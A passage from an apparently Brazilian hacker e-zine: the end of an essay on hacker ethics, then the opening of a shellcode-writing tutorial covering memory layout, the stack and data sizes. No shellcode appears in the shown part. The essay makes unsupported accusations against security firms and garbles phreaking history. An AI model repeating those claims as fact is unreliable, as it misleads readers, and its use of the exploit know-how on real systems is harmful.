um fantoche de grandes empresas porque nao foi bem informado! Se nao tivermos  o
minimo de senso critico, certamente seremos facilmente enganados por esta  corja
que  aih se  encontra.Vou dizer  o que  penso sobre  determinados temas,  mas o
intuito aqui eh fazer voce pensar sobre eles usando seu proprio senso critico  e
buscando a verdade atras do fatos.Se pergunte sobre os porques, levante duvidas,
raciocine!  Meus  txts ganharam  a  abrangencia que  eu  desejava, mas  de  nada
adiantarah expandir os conhecimentos tecnicos se nao puder dar a conhecer alguns
pensamentos  'eticos'.Se esta  parte te  interessa recomendo  a voce  le-la com
bastante calma,  sendo critico  e procurando  ver o  que estah  por tras de cada
afirmacao! Se voce pensa igual ou diferente, nao importa! Eu
quero apenas que voce pense! Seja Critico!!

2.1. - A confusao dos Termos
-----------------------------

O que eh ser hacker afinal?? O que eh ser um fucador???
A midia, como em tudo, demonstra  ignorancia quanto a verdade, alienando mais  e
mais pessoas.A parte podre da comunidade de seguranca nao pensa em outra coisa a
nao ser 'sujar' a definicao ao maximo.E voce, sabe o que eh ser
um hacker???

A origem  do termo  hacker remonta  aos primordios  da revolucao tecnologica. Na
verdade, se for levar  ao peh da letra,  os hackers derivam dos  phreaks, que se
originaram nos primordios  da invencao do  Telefone.Mas no entanto,  o termo soh
veio se  popularizar depois  que os  phreaks comecaram  a se  difundir em  larga
escala, isso se deu no inicio da decada de 70, mais ou menos.A inspiracao  maior
no mundo 'phreak' deu inicio com john draper vulgo Capitao Crunch, ele descobriu
um metodo de fazer  ligacoes gratuitas usando um  apito que vinha numa  caixa de
cereais.A  popularizacao  desta  tecnica  levou  dois  jovens  inescrupulosos  a
automatizarem o processo, criando as  famosas RED BOX, esses dois  individuos se
chamam Steve Jobs e Steve  Wosniak(Ambos fundadores da APPLE).Desde entao  houve
um  crescimento  consideravel  das  tecnicas  e  meios  de  manipular  o sistema
Telefonico americano.Enquanto os phreaks cresciam em numero e conhecimentos,  no
MIT(Instituto Tecnologico  de Massachussets),  estudantes arrombaravam  salas de
informatica a noite para poderem  aprender mais sobre os carissimos  Sistemas de
Computadores.A  palavra hacker  em ingles  significa 'machado  de duas  pontas',
muito provavelmente eles  usavam isso para  quebrarem os cadeados,  ou o proprio
comportamento deles  se assemelhava  a isso.Eles  queriam obter  conhecimentos a
qualquer custo.O  conceito 'hacker'  expandiu, ou  seja, varias  pessoas queriam
dominar um conhecimento cada vez maior  sobre algo, nao importando os meios  que
usassem.'A busca pelo conhecimento eh uma atividade basica do ser humano',  logo
nao deve ser repelida.Durante  a decada de 80  muita coisa aconteceu no  cenario
hacker- phreak, levando  desde perseguicao, criacao  de leis rigorosas  ateh uma
maior compreensao  de algumas  entidades e  a criacao  de varias  'entidades' de
defesa dos ideais e interesse dos  hackers... O que chamo aqui de  entidade, nao
eh nada relacionado ao que conhecemos por entidade, eh mais alem, algumas  delas
eh fundamental um fucador conhecer, como a Eletronic Frountier  Foundation(EFF),
a 2600(o quartel general hacker), e etc.

Se voce for  buscar a verdade  bem no fundo  verah que quase  tudo relacionado a
informatica hoje  em dia  teve uma  colaboracao maior  de hackers.Internet,  PC,
Softwares Gratuitos,  enfim os  hackers se  expandiram em  todos os segmentos da
informatica aprimorando-os sempre.A relacao do hacker e do phreak eh mais  alem,
no  inicio  os phreaks  lutavam  contra as  grandes  companhias telefonicas,  as
grandes corporacoes e  os governos, nao  possuiam nacionalidade e  nao defendiam
uma  etnia,  eram  livres  e  os  unicos  'inimigos'  era  justamente  esses jah
citados.Invadiam sistemas telefonicos, ensinavam  truques para se fazer  ligacao
gratuita,  etc.. Os  hackers tambem  trilharam o  mesmo caminho  unido forcas  e
lutando pelos mesmos ideiais, desafiando  os mesmos inimigos e divulgando  o que
consideravam a sua maior bandeira: "A LIBERDADE DE INFORMACAO", isto culminou em
1984 com a criacao do projeto GNU, criado por um hacker.Desde jah fica  evidente
que  um  hacker   nao  trabalha  para   grandes  corporacoes  ou   empresas  sem
escrupulos(Microsoft,  Conectiva, Sun,  Apple, Intel  e etc)..  Sim, os  hackers
lutavam contra empresas deste tipo  e continuam lutando!! Mas eles(os  inimigos)
tem os meios de comunicacao, possuem os governos em suas maos, entao logo veio a
retaliacao,e  uma  verdadeira  caca  as  bruxas  ocorreu  no  Estados  Unidos em
1990/1991,batizada de Operacao SunDevil, muita gente inocente foi presa
e vidas foram acabadas.

No brasil, somente na decada de 90 veio a ocorrer uma maior divulgacao do  termo
hacker e da etica hacker, o zine  'Barata eletrica' de Denerval Cunha foi e  tem
sido quem mais expandiu  o que representa a  etica hacker e a  'cultura' pregada
pelo hacking.Este zine eh leitura obrigatoria para qualquer fucador etico!

Os termos hoje em  dia estao confusos, muita  gente prefere nao ser  considerado
como  hacker pois  pode ser  banalizado ou  mesmo prejudicado,  a ofensiva  dos
'inimigos'  foi  grande,  e  os  verdadeiros  hackers  tem  sofrido  na  pele  a
consequencia desta 'guerra'! Ainda ha  muito para ser feito, muita  gente possui
total ignorancia quanto aos termos, mas o que devemos sempre deixar claro eh que
hacker nao  eh cracker,  e que  a Comunidade  de Seguranca  nao eh, nunca foi, e
nunca vai ser  aliada dos hackers,  eles fazem parte  do sistema!!! Sabemos  que
existe gente seria na Seguranca, eh o que chamamos de 'parte boa' da  Seguranca,
no entando a maioria nao  o eh, eh o que  chamamos de 'BANDA PODRE!'. Um  hacker
nao muda home page ou destroi um  sistema, quem faz isso sao kiddies ou  lamers,
sejamos bem evidentes nisso!!! Mesmo  que chamem para questoes ideologicas,  nao
faz parte do  hacking qualquer ideologia  NACIONALISTA!! A Comunidade  hacker eh
uma soh, assim como as grandes corporacoes  o sao, ou voce acha que a  Microsoft
Brasil e melhor, mais legal, mais escrupulosa do que a Microsoft USA??

Quanto  aos crackers,  eles tem  levado vantagem  em tudo,  com o  termo hacker
derrubado, com hackers de verdade sendo perseguidos, esses crackers tem  vencido
a batalha..A comunidade de seguranca nunca foi competente o bastante, os hackers
ajudam, mas 'a banda podre' nao ve com bons olhos, termina os crackers se  dando
bem  e  os  hackers e  os  usuarios  normais saindo  prejudicados.  Agora  eu te
pergunto, a comunidade de seguranca ganha ou perde com os crackers??? Ao meu ver
eles ganham,  por isso,  ao meu  ver, Crackers  e Banda  Podre da  Comunidade de
Seguranca sao um soh!!!
Abra os olhos, a verdade tah procurando voce!!!

2.2. - A Comunidade de Seguranca e Voce
------------------------------------------

Temos que saber diferenciar o que estah por tras.No item anterior eu falei sobre
dois lados da Comunidade de Seguranca, a banda podre e a "parte boa" (parte  boa
entre aspas). Se voce eh um fucador experiente certamente sabe mais coisas sobre
isto do que  eu, mas falarei  um pouco do  que eu acho,  para que os  mais novos
possam levantar criticas.
Podemos dividir a comunidade de Seguranca em 4 grupos, vejamos abaixo:

* OS DESINFORMADOS
-------------------

Estes sao aqueles que nao  conhecem o que eh hacker,  nem o que eh cracker.  Nao
conhecem a historia da informatica, nao sabem a origem da Seguranca de  Sistemas
Informatizados, e sao 'moldados' pela  banda podre da comunidade de  seguranca e
pela midia.Na grande maioria sao estudantes universitarios ou recem formados que
partiram para  a Seguranca  porque eh  o que  mais dah  dinheiro hoje em dia, se
desse mais  dinheiro mexer  com outra  coisa, eles  estariam lah com certeza.Nao
possuem a  paixao pelo  que fazem  e odeiam  os hackers  puramente porque  foram
'ensinados' a odiarem. Esta eh a parte mais inofensiva que existe, e a unica que
ainda pode ser 'ganha' para a causa, ou seja, ainda podemos mudar a opniao deles
quanto ao termo hacker.Necessitam de ajuda, pois nao possuem a malicia, e nao
conhecem a capacidade de um cracker.

* OS MEDROSOS
--------------

Essa eh uma 'classe' esquisita da Comunidade de Seguranca.Sao pessoas que  sabem
diferenciar  os termos  crackers e  hackers, simpatizam  com as  ideologias dos
hackers, conseguem ver a beleza da etica, no entanto temem! Temem perderem  seus
empregos para hackers com maiores conhecimentos! Temem perderem seus empregos se
defenderem os  hackers em  alguma situacao!!Temem!!  Na maioria  sao pessoas com
bons  conhecimentos  tecnicos,  mas trabalhando  em  empresas  erradas! Costumam
ficarem quietos,  nao opinando  em quase  nada fora  do 'assunto tecnico'.Alguns
possuem uma vontade de libertar o  espirito hacker de dentro dele, mas  algo nao
permite, temem  morrerem de  fome por  defenderem a  causa hacker,  temem muitas
outras coisas, por isso sao considerados como os medrosos!!

* A BANDA PODRE
----------------

A banda  podre eh  bem ramificada.Na  grande maioria  sao altos  funcionarios de
grandes empresas(Microsoft, NAI,Norton, etc), que detonam o termo hacker  porque
os hackers sao  os unicos que  os denunciam.Sao esses  que se alegram  quando um
cracker consegue fazer algo grandioso  pois eles irao lucrar vendendo  mais seus
produtos e servicos.Defendem com unhas  e dentes os produtos que  comercializam,
mesmo chegando as  vezes a falarem  'loucuras' para poderem  enganar os que  nao
enxergam o que estah por tras dos seus interesses.Alguns fabricam virus, colocam
a culpa  nos hackers(hackers  nao publicam  virus) e  depois vendem  antitodos e
antivirus para combaterem a praga que eles mesmo criaram.Outras empresas se unem
a governos  e fraudam  o processo  elitoral para  que um determinado 'candidato'
venca para  depois assinar  um contrato  milionario com  a empresa.Essas pessoas
representam aquelas grandes  corporacoes que vimos  no item anterior,  e elas eh
quem devemos denunciar!

* A PARTE BOA
--------------

A parte boa eh representada por alguns membros(menos de 0,01%) da Comunidade  de
Seguranca que  acreditam nos  ideiais hackers,  divulgam o  sentido dos  termos,
ajudam hackers quando perseguidos, se  aliam a hackers para denunciar  problemas
com  a 'banda  podre' e  as empresas  representadas por  esta 'banda  podre', e
principalmente lutam pela seguranca por  usuarios comuns.Essa parte boa goza  de
um  prestigio  grande  na  Comunidade Hacker  e  sao  sempre  bem quistos.Alguns
abandonam  a Comunidade  de Seguranca  e passam  a fazer  frente na  Comunidade
Hacker,  outros  acreditam  que  estar na  Comunidade  de  Seguranca  serve como
estrategia para 'derrubar' as corporacoes inescrupulosas e a 'parte podre'.Esses
profissionais possuem o meu total respeito e consideracao.

Agora que voce sabe quem eh quem, abra os olhos para nao ser ludibriado.
Cuidado com 'as raposas vestidas de cordeiros'.Fique atento sempre!!
Seja Critico!

2.3. - Codigo Aberto x Codigo Fechado
--------------------------------------

Essa discussao  vem ganhando  ambito, principalmente  no que  se pode  chamar de
'guerra' entre Windows e Linux.O que voce acha mano, codigo fonte aberto eh mais
seguro  do que  fechado?? Para  um hacker  o que  eh melhor??  Irei expor  minha
opiniao sobre isso, analise voce mesmo e tire suas
conclusoes.

O codigo aberto  nada mais eh  do que a  exposicao total dos  codigos fontes que
serao usados por determinada  aplicacao ou programa.Essa filosofia  ganhou forca
apos a criacao do  projeto GNU que tornava  livre os softwares. Muitos  sistemas
adotam  esta  filosofia,  inclusive o  Sistema  Operacional  OPENBSD considerado
atualmente como o  sistema operacional mais  seguro que existe.Esse  exemplo por
sih soh jah mostra que o codigo fonte aberto eh algo bom para a seguranca de  um
Sistema  Operacional.A  guerra que  vem  sendo travada  no  momento eh  Linux  x
Windows, e nao  OpenBSD x Windows,  consegue entender?? A  Microsoft tem perdido
fatia no mercado para o Linux, entao ela precisa atacar o Linux de alguma  forma
e o alvo escolhido foi o conceito 'Codigo Fonte Aberto'.Para um hacker o que  eh
melhor,  aberto ou  fechado???E para  um cracker??  Por que  pessoas defendem  o
codigo fonte
fechado?? Respostas a essas perguntas seguem abaixo:

+ Para um  hacker, o que  eh melhor em  busca de 'LIBERDADE  DE INFORMACAO' e  a
seguranca dos usuarios comuns, eh o melhor para ele.No primeiro ponto, o  codigo
fonte aberto proporciona um maior  intercambio, maior troca de informacoes,  uma
evolucao maior no  aprendizado da informatica.Com  o codigo fonte  aberto varios
usuarios podem  opinar, melhorar  o programa,  apontar erros  e solucoes,  podem
'personalizar' o sistema.A seguranca tende a aumentar, pois muita gente  estarah
analisando os codigos, seja em busca de bugs ateh backdoors,para o usuario comum
isto eh lucro! Entao o codigo fonte aberto soh traz beneficios, logo, um  hacker
defende o aumento deste conceito, pois todos tem a ganhar, exceto os inimigos
dos hackers, que vimos anteriormente, pois eles sobrevivem no ocultismo.

+ Para um cracker  o software aberto eh  uma barreira.Torna a longo  prazo, mais
dificil dele penetrar nos sistemas, e a instalacao de backdoors e virus passa  a
ser infinitamente  mais visivel  que num  codigo fechado.A  troca de informacoes
prejudica a  acao de  crackers, pois  uma tecnica  que ele  domina hoje  eh mais
rapidamente combatida com a troca de informacoes, jah que a solucao nao  estarah
somente nas maos de 1 unica empresa.Nao se iluda amigo, os crackers hoje em  dia
possuem conhecimentos maiores que a atual Comunidade de Seguranca!

+ Mas vemos pessoas defenderem o uso de softwares com codigo fonte fechado!  Nao
podemos generalizar, mas nesse ponto, ao meu ver, as pessoas que defendem o  uso
de software de codigo fechado podem ser divididas em dois
grupos.Sao eles:

* Os Desinformados -> Falta  conhecimentos sobre tecnicas usadas por  crackers e
nao conhecem nem mesmo as estatisticas divulgadas de invasoes.Acham que crackers
nao possuem conhecimentos superiores aos deles e creem que uma forma de barrar a
acao dos crackers  eh justamente limitar  a 'liberdade de  informacao'.Chegam ao
cumulo de  acharem que  crackers aprendem  atraves de  mail list  como bugtraq!!
Crackers e Hackers estao ha  alguns passos do que eles  consideram 'conhecimento
tecnico  avancado'  de  pratica de  seguranca.A  grande  maioria dessas  pessoas
obedecem ao ego e por isso possuem sua parte de culpa 'no crescimento dos crimes
de informatica'.

*  Os  Inescrupulosos  ->  Esses  sao  os  que  defendem  pensando  em interesse
proprio.Nao se importa  com o usuario  comum e defendem  o codigo fonte  fechado
porque  trabalham  para empresas  que  usam codigo  fonte  fechado! Sao  pessoas
inescrupulosas, pois conhecem a verdade, mas defendem a mentira unicamente  para
obterem vantagens pessoais.Pregam a obscuridade em tudo, ou seja, jamais ensinam
o que aprenderam(olha que na maioria das vezes eles aprendem com hackers!).Temem
que  um  maior  crescimento  da conciencia  de  software  livre  e liberdade  de
informacao possam deixa-los desempregados.Sao pessoas capazes de fazerem  coisas
'monstruosas' para  defenderem seus  lucros, inclusive  injetarem backdoors  nos
seus produtos a mando de um governo qualquer(vide chave NSA).

Eh bastante comum  em mail lists  aparecem mensagens de  pessoas que defendem  o
codigo fonte fechado.Muita discussao rola sobre isso, mas amigo, o pessoal  mais
velho jah conhece muito bem essas figuras.Nao perca seu tempo discutindo em mail
lists,  o  que eu  tenho  visto ultimamente,  eh  um monte  de  gente defendendo
empresas sem escrupulos(Microsoft,SUN, Red Hat,  Conectiva, etc, etc e etc)  por
interesses proprios.Nao se preocupe, pois qualquer um com conhecimentos  basicos
de informatica sabe que essas empresas nao sao boas na parte tecnica e  pessimas
na parte etica.E alem de tudo, a verdade
eh uma soh e ela se manifesta no tempo apropriado!

2.4. - O Lucro com o Hacking
-----------------------------

Livros, revistas, jornais, filmes,patrocinios  em home pages e  etc.. Atualmente
falar  sobre hackers  eh alvo  rentavel, existem  dezenas de  livros que  vendem
'tecnicas milagrosas' para se invadir  redes como a do pentagono.  Existem sites
que esbanjam o nome 'HACKER' em atividades criminosas em busca de obter  retorno
de investimento.Membros da parte podre da comunidade de seguranca dando cursos e
mais cursos visando nada mais nada menos  do que formulas de como se livrar  dos
hackers.Jornalistas  inescrupulosos atras  de 'ibope'  e ascensao  meteorica na
carreira entrevistando criminosos e criancas que se dizem hackers.Essas  pessoas
sao despreziveis, sua essencia
eh desprezivel.

O  hacking  eh  maior do  que  tudo  isto, a  beleza  do  hacking nao  pode  ser
comercializada, pois pouca gente conseguiria visualizar a leveza e grandiosidade
que envolve a etica  hacker.As pessoas hoje em  dia buscam lucro em  tudo que se
pode imaginar, e o hacking nao eh diferente. Quanto mais catastrofico o cenario,
melhor  para essas  pessoas, no  entanto, o  hacking tem  superado isto  tudo e
permanece vivo apos todas essas sucessivas 'difamacoes'.Temos pessoas ainda hoje
em dia  que contemplam  a verdade  e buscam  viver a  verdade.Nenhuma riqueza no
mundo eh capaz de alegrar o coracao de um fucador como o hacking etico  consegue
fazer. Mesmo com toda  essa 'sujeira' ainda existe  uma esperanca e eh  por isso
que escrevo.O hacking puro eh capaz de mudar mentalidades e fazer transparecer a
verdade, verdade estah que estah oculta aos olhos da maioria das pessoas.A etica
hacker eh capaz de nos ensinar valores morais que toda a sociedade se  alegraria
em ver!

O  hacker  nao  eh  nacionalista,ele  busca  a  paz,  nao  eh  ganancioso  e nem
capitalista,  ele eh  democratico, eh  sincero, eh  verdadeiro.Um hacker  eh um
sonhador,  eh  um  revolucionario,  eh  um  co-irmao  de  todos  os  oprimidos e
discriminados.Um hacker  eh justo  e fiel,  se apega  a seus  principios e morre
defendendo eles.A etica hacker estah alem  de uma pessoa soh, estah alem  de uma
comunidade soh ou de um pensamento soh! A essencia do hacker eh a liberdade!
Liberdade esta verdadeira, nao a pregada por governos.

Um hacker eh um guerreiro, um guerreiro em fase de extincao!

Este eh  o meu  pensamento sobre  esses assuntos.Tem  muito mais  coisas para se
discutir.A etica hacker nao eh um pensamento de um soh homem.Existem bons textos
que divulgam  'a etica  hacker em  sua essencia',  recomendo a  leitura do  zine
Barata Eletrica,  lah voce  poderah encontrar  informacoes valiosissimas!  Estou
aberto a discussao e a receber opinioes sobre esses assuntos, meu e-mail estah a
disposicao. Seja critico nas  coisas que eu escrevi,  pergunte a sih mesmo  se o
que escrevi  eh verdade,  se essas  coisas sao  assim mesmo,  busque voce  mesmo
formar  a  sua  opiniao  a respeito  desses  assuntos,  nao  deixe nunca  alguem
"escravizar a sua mente".As dificuldades da vida sao muitas, e pessoas  mudam...
Mas  os  feitos  permanecem,  e  se  conseguir  enxergar  os  feitos,  verah   a
grandiosidade ou a monstruosidade
das pessoas!

HACK THE PLANET!!!!





=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=[ 13 ]=-=[ Básico Shell Code ]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

########################################################################
######################## UNSEKURITY TEAM ###############################
########################################################################

IP_FIX: Atual Clube dos Mercenários, http://cdm.frontthescene.com.br

http://unsekurity.virtualave.net/

Desenvolvido por Nash Leon vulgo coracaodeleao.
Thanks Ramona,Magic Kiss e Unsekurity Team.
nashleon@yahoo.com.br

Aviso: Nao nos responsabilizamos pelo mau uso dos programas e dados aqui
       fornecidos, bem como a utilizacao desse texto p/ fins maliciosos,
       este texto possui somente propositos educacionais.


		     ---------------------------------
		    |	TUTORIAL BASICO DE ESCRITA    |
		    |	       DE SHELLCODES	      |
		     ---------------------------------


------------------------------ INDICE -------------------------------
1.INTRODUCAO
2.MODELO USUAL DE MEMORIA
  2.1 A Regiao do Stack(Pilha)
3.TERMOS NECESSARIOS DO JARGAO
4.CALCULOS ENVOLVENDO AS NOTACOES (hexa,decimal e binario)
  4.1 Sistemas Decimal e Binario
  4.2 Sistema Hexadecimal
5.REGISTRADORES
  5.1 Registradores Gerais
  5.2 Registradores de Segmento
  5.3 Registradores de Indexacao do Stack
  5.4 Outros Registradores muito Usados
6.LISTA DE COMANDOS
  6.1 Instrucoes de Transferencia
  6.2 Instrucoes Aritmeticas
  6.3 Instrucoes de Comparacao
  6.4 Instrucoes de Salto
  6.5 Instrucoes Logicas
7.SHELLCODES
  7.1 Shellcode /bin/sh
  7.2 Shellcode para setuid(0)
  7.3 Shellcode para quebrar chroot()
  7.4 Dividas para o proximo tutorial
8.TERMINANDO
  8.1 Diferencas entre a sintaxe INTEL & AT&T
  8.2 Links e Referencias
  8.3 Consideracoes Finais
----------------------------------------------------------------------


-------------
1. INTRODUCAO|
-------------

Bem amigo, estou de novo aqui, tentando disponibilizar alguma coisa  relacionada
ao mundo dos fucadores(fussadores).A recepcao  ao txt anterior foi muito  boa, e
os creditos se devem  a uniao que vem  sendo apresentada pelo grupo  "Unsekurity
Team", entao soh cabe a mim, dar continuidade aos trabalhos, sendo que em  breve
estaremos disponibilizando  projetos desenvolvidos  por nos  mesmos, visando  um
maior intercambio entre os membros e a comunidade que mexe com "inseguranca"  de
um modo geral. Esse tutorial nao  tem o intuito de se aprofundar  neste assunto,
somente dar o ponta-peh inicial,  virao outros tutoriais em breve,  visando mais
aprofundamente e aperfeicoamente desta materia(Escrita de shellcodes).A  questao
do tempo,  nosso inimigo,  tem sido  levada em  conta, por  isso devemos  ir com
calma.Logo em  breve, estaremos  avancando juntos,  na divulgacao  de Teorias  e
Praticas mais abrangentes, e divulgando mais materiais interessantes no que  diz
respeito a conhecimentos  na area de  programacao voltada a  fucadores.O intuito
nao eh, nem jamais serah dar receitinhas de bolo, ou mesmo, disponibilizar lixo.
Tendo em vista um  publico alvo de Newbies,  digo isso nao por  menosprezo, como
tem gente  falando por  aih, pois  antes de  tudo eu  tambem sou um Newbie, vivo
pesquisando e buscando  informacoes.Voce deve estar  se perguntando, mas  newbie
sao  novatos,   begginers,  sem   experiencia!!!Quem  disse   que  eu   nao  sou
isso??:)...Hoje  em dia  eh preferivel  mil vezes  ser conhecido  e chamado  de
"lamer"  do  que qualquer  outra  coisa. Tendo  em  vista que  a  midia diz  que
"hackers"  destruiram  isso   e  aquilo,  que   mudaram  essa  ou   aquela  home
page!!Prefiro  ser  comparado  com  lamer  do  que  com  isso!!  Mas,  bola para
frente,iremos escrever shellcodes  baseados em assembly,  Como o escritor  desse
texto nunca pisou numa faculdade  de computacao ou num curso  de programacao,nao
se pode  esperar muito  dele nesse  quesito, por  isso irmao,rale!!pense!  corra
atras!!Sabemos que fucadores sao praticos, isso os coloca numa classe onde de um
lado,os programadores experientes que mexem com softs complexos dizem: "eles nao
sabem programar"   e do  outro profissionais  da seguranca  que dizem: "Eles sao
bons programadores", e voce no meio disso  tudo sem saber se sabe das coisas  ou
nao.Vai minha opiniao,fucadores sao praticos!!programam o essencial p/ se  obter
um determinado objetivo!! Desse modo a seguranca e os programadores  experientes
estao  certo,  fucadores nao  mexem  com metodos  complexos  de algoritmos,  mas
alcancam com o que sabem o alvo que estipularam.Sendo um bom ou mau  programador
voce pode  sim um  dia ser  um otimo  fucador.Tem gente  que diz  que eh dificil
escrever um  exploit!!Acho que  a maioria  sabe que  a coisa  varia, mas fazer a
carcaca, e entender o por que da carcaca, creio que todos
que leram a phrack 49 jah sabem!!:)

Vamos deixar de conversa fiada e vamos caminhando.Os exemplos akih serao  feitos
todos em  plataforma linux,  usando o  compilador gcc  mesmo. Lembrando que esse
texto eh voltado p/ shellcodes em c.Usaremos  o debugador gdb da gnu que vem  na
maioria dos  linuxes descentes.  A sintaxe   serah a  AT&T(para unix),sendo  que
terah  no  final  uma  breve  explicacao   sobre  ela,p/  usuarios  de  sistemas
INTEL(dos) verem como funciona a coisa. Vamos partir do inicio que voce jah  leu
ou sabe alguma coisa de assembly,que conhece o porque de se usar essa linguagem,
e essas coisas  toda de se  programar com assembly,porque  se pode fazer  isso e
aquilo. Os exemplos praticos aqui descrito sao simples,mas a medida que a  coisa
for  ficando cada  vez mais  dificil, iremos  recapitular,de modo  que antes  de
comecarmos   eu  jah   aviso:  Paciencia!!Tenha   muita  Paciencia!!   Estaremos
trabalhando com baixo nivel,  soh quem conhece sabe  o poder que essa  linguagem
possui.Pense  que,   os  melhores   virus,os  melhores   exploits,  os  melhores
shellcodes,os melhores ??????? foram feitos  em assembly por pessoas que  um dia
sabiam menos do que voce amigo.Como eu nao pretendo ir fundo em assembly, cabe a
voce  pesquisar  mais  sobre  essa  linguagem,  caso  necessite  mesmo.Outro pre
-requisito eh saber  programar em C,  hoje em dia  o fucador necessita  ir fundo
nessa linguagem.
Bom, daremos inicio logo a esta jornada.Boa Sorte Fera!!!

---------------------------
2. MODELO USUAL DE MEMORIA |
---------------------------

O  modelo usual  de memoria  difere de  sistema para  sistema.Em Linux/i386  ela
possui modelo flat de 32 bit.Um  programa pode ser dividido em secoes.As  secoes
sao .text para seu codigo, .data para seus dados, .bss para dados indefinidos.Os
programas devem ter no minimo a secao .text.
Um esquema para visualizacao disso seria:


			-------------------
		       |       .DATA       |
		       |      (Stack)	   |
			-------------------
		       |       .BSS	   |
		       |      (Heap)       |
			-------------------
		       |       .TEXT       |
			-------------------


Como  vimos acima,  eu coloquei  as respectivas  regioes onde  ocorrem oveflows
relacionados.Stack overflows ocorrem na regiao .data, heap tambem pode ser usado
p/  sobrescrever  essa  regiao  (.data),   mas  eh  usualmente  mais  usado   p/
sobrescrever a regiao .bss.Num outro txt, veremos como fazer overflows, mas  por
enquanto, se atenha soh ao shellcode(codigo que se executa via exploits) que se
localizarao na regiao Stack.


2.1 - A REGIAO DO STACK (PILHA)
---------------------------------

A  regiao   conhecida  como   STACK  ou   pilha,  eh   responsavel  por  receber
dados(argumentos)  e  passa-los  p/   as  funcoes.Essa  regiao  possui   tamanho
relativo(muda quase sempre).O nome que se dah a essa regiao(STACK) eh porque ela
pode ser comparada a uma pilha, onde voce vai enchendo ela de dados, soh que ela
possui uma  particularidade.Essa particularidade  consiste em:  O ultimo  dado a
entrar serah  o primeiro  a sair,  chamamos isso  de LIFO  - last  in, first out
(ultimo a  entrar,primeiro a  sair). Na  medida em  que eh  usado, o  Stack ou a
pilha,chamarei de Stack, cresce p/  baixo, sendo assim, a quantidade  de memoria
necessaria  eh  determinada  pela  maneira  como  o  programa  foi projetado.Por
exemplo, um  programa com  muitas funcoes  recursivas utiliza  mais memoria   no
Stack do  que um  programa sem  funcoes recursivas,  justamente porque variaveis
locais  sao  armazenadas  no  Stack.A parte  necessaria  para  o  programa e  as
variaveis  globais,  eh  determinada   durante  a  execucao  do   programa.  Uma
pilha(Stack) eh o contrario  de uma fila,porque usa  o acesso "ultimo a  entrar,
primeiro a sair", denominado LIFO.Para  visualizar um Stack, basta imaginar  uma
pilha de pratos.O prato da  base do Stack eh o  ultimo a ser usado e  o prato do
topo,  o  primeiro.Stacks  sao  geralmente  utilizados  em  softwares   basicos,
incluindo compiladores e interpretadores.Geralmente o C usa o Stack quando passa
parametros(argumentos)  as  funcoes.Dois  comandos em  assembly  sao  usado para
enviar e retirar dados do Stack, sao eles push e pop, respectivamente.

Veremos abaixo o esquema de um Stack em acao:
         Acao                   Conteudo do Stack
        ------                ---------------------

       push(A)                          A
       push(B)                          A  B
       push(C)                          A  B  C
       pop()  /* retira o ultimo */     A  B
       push(N)                          A  B  N
       pop()                            A  B
       pop()                            A
       pop()                            /* vazio */



Vemos acima o esquema da LIFO - ultimo a entrar,primeiro a sair. Isso eh mais do
que o suficiente, espero que tenha ficado claro as coisas para voce,amigo!!

--------------------------------
3. TERMOS NECESSARIOS NO JARGAO |
--------------------------------

Se voce manja de assembly, JMP 7.Se nao, entao isto eh util para voce.

Iniciaremos aprendendo um pouco sobre alguns termos no jargao da informatica que
serao muito uteis para nosso aprendizado,comecaremos do mais simples:

1 BIT:		|0|

Simplesmente o menor dado que existe.O computador entende em duas condicoes um 1
ou um 0.
Exemplo: |00000001| = 1 ; |00000010| = 2;

1 NIBBLE:	|0000|

1 NIBBLE equivale a 4 BITs, e eh metade de um BYTE.Se voce notar, verah que  ele
possui um valor  maximo de 15(|1111|).  Numeros em hexadecimais  sao baseados no
NIBBLE, possuem tambem  um valor maximo  de 15, que  eh representado pela  letra
F.Os digitos em HEXADECIMAL seguem a seguinte ordem:

"0123456789ABCDEF"

A notacao  padrao para  numeros em  HEXADECIMAL eh  zero seguido  pelo numero em
hexadecimal, seguido pela letra "h" indicando que estah em hexa.
Exemplo: "0FFh" = 255 em decimal.

Como vamos mecher com compilador  C, geralmente usaremos a notacao  seguinte: Um
zero seguido de um x e em seguida o numero em hexadecimal.
0xff = 255 em decimal.

Um exemplo pratico para vermos isso usando C, seria:

#include <stdio.h>
main(){
printf("O numero 255 em hexadecimal eh 0x%x \n",255);
}


Como podemos ver esse  0x antes do numero  propriamente dito em hexa  eh somente
por padronizacao,  e adotaremos  ele no  decorrer desse  tutorial. Veremos agora
algumas coisas sobre BYTE.

1 BYTE:		|00000000|
2 NIBBLES	   %al
8 BITS

Como podemos ver,  1 BYTE eh  diferente de 1  BIT,muita gente costuma  confundir
isto.Um  BYTE possui  um valor  maximo de  0xFF (  = 255  em decimal).  Um BYTE
equivale a 2 NIBBLES, entao  sua representacao hexadecimal eh simplesmente  dois
digitos hexa  em uma  fila. Exemplo:  0x14, 0x20,  0xAE, 0xff,  etc. Esse  "%al"
descrito acima, representa um tipo de registrador de tamanho de 1 BYTE, no caso,
esse registrador eh o Acumulador Low(Acumulador Baixo).Estamos desde jah  usando
a sintaxe AT&T, se voce estah  acostumado com a sintaxe INTEL, leia  mais abaixo
as diferencas.Mais lah na frente voce verah  o que significa esse "al".  Veremos
agora outro termo  muito conhecido do  jargao, a WORD,  alguns preferem traduzir
por PALAVRA, mas ficarei com a forma original, como poucos traduzem NIBBLE,  nao
traduzirei nenhum desses termos p/ que voce possa jah ir se acostumando com eles
na forma original.

1 WORD:		|0000000000000000|
2 BYTEs           %ah     %al
4 NIBBLEs             %ax
16 BITs

Vemos que nesse  termo tambem nao  ha muito segredo,  1 WORD (%ax)  equivale a 2
BYTEs (%ah + %al), 4 NIBBLES, logo eh representado com 4 digitos em hexadecimal.
Este eh o tamanho dos registradores  de 16 bits em sistemas 80x86.Veremos  agora
um DWORD ou dupla WORD.

1 DWORD:
2 WORDs:	|00000000000000000000000000000000|
4 BYTEs:			    %ah	    %al
8 NIBBLES:				%ax
32 BITs:			%eax

Uma DWORD equivale a 2 WORDs,  tambem possui o nome DOUBLE-WORD.Possui um  valor
maximo  de  0xFFFFFFFF,  8   NIBBLES("F"),  que  equivale  a   4,294,967,295  em
decimal.Pequeno hein!! Como vimos, linux eh 32bits, usaremos muito essa  notacao
